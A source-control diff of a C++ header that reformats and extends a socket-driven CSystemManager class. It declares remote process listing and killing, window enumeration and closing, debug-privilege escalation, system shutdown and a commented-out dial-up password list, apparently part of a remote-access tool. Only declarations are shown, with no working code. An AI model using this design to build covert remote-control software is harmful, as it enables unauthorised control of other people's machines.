@@ -9,18 +9,21 @@
 class CSystemManager : public CManager  
 {
 public:
-	CSystemManager(CClientSocket *pClient);
-	virtual ~CSystemManager();
-	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
+	// 进程管理与窗口管理共用这个类，用nWhich来区分
+	CSystemManager(CClientSocket *pClient, UINT nWhich);
+	virtual			~CSystemManager();
+	virtual void	OnReceive(LPBYTE lpBuffer, UINT nSize);
 
-	static bool DebugPrivilege(const char *PName,BOOL bEnable);
-	static bool CALLBACK EnumWindowsProc( HWND hwnd, LPARAM lParam);
-	static void ShutdownWindows(DWORD dwReason);
+	static bool		DebugPrivilege(const char *PName,BOOL bEnable);
+	static bool		CALLBACK EnumWindowsProc( HWND hwnd, LPARAM lParam);
+	static void		ShutdownWindows(DWORD dwReason);
 private:
-	LPBYTE getProcessList();
-	LPBYTE getWindowsList();
-	void SendProcessList();
-	void SendWindowsList();
+	LPBYTE			getProcessList();
+	LPBYTE			getWindowsList();
+	void			SendProcessList();
+	void			SendWindowsList();
+	void			CloseWindow(LPBYTE buf);
+	void			TestWindow(LPBYTE buf);
 	//void SendDialupassList();
-	void KillProcess(LPBYTE lpBuffer, UINT nSize);
+	void			KillProcess(LPBYTE lpBuffer, UINT nSize);
 };
